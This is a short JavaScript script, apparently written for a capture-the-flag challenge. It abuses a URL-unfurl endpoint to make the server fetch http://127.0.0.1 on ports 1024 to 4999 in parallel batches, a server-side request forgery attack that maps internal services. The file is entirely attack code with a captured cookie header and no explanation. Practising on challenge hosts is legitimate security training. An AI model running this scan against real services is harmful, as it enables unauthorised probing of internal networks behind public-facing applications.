const chunk = (arr, size) =>
  Array.from({ length: Math.ceil(arr.length / size) }, (v, i) =>
    arr.slice(i * size, i * size + size)
  );

const f = async (i) => {
  const response = await fetch("http://challenge.ctf.games:30299/unfurl", {
    "headers": {
      "accept": "*/*",
      "accept-language": "en,ru;q=0.9,ru-RU;q=0.8,en-US;q=0.7,lt;q=0.6,pl;q=0.5",
      "content-type": "application/json",
      "cookie": "_clck=120mk45%7C2%7Cfts%7C0%7C1884; _clsk=1ch0gzo%7C1740690687707%7C17%7C1%7Ca.clarity.ms%2Fcollect",
      "Referer": "http://challenge.ctf.games:30299/",
      "Referrer-Policy": "strict-origin-when-cross-origin"
    },
    "body": `{\"url\":\"http://127.0.0.1:${i}\"}`,
    "method": "POST"
  });

  const json = await response.json();

  console.log(json, i);
}

const main = async () => {
  const ns = Array.from(Array(3976).keys()).map(i => i + 1024);
  const chunks = chunk(ns, 100);
  for (const chunk of chunks) {
    await Promise.all(chunk.map(i => f(i)))
  }
}

main();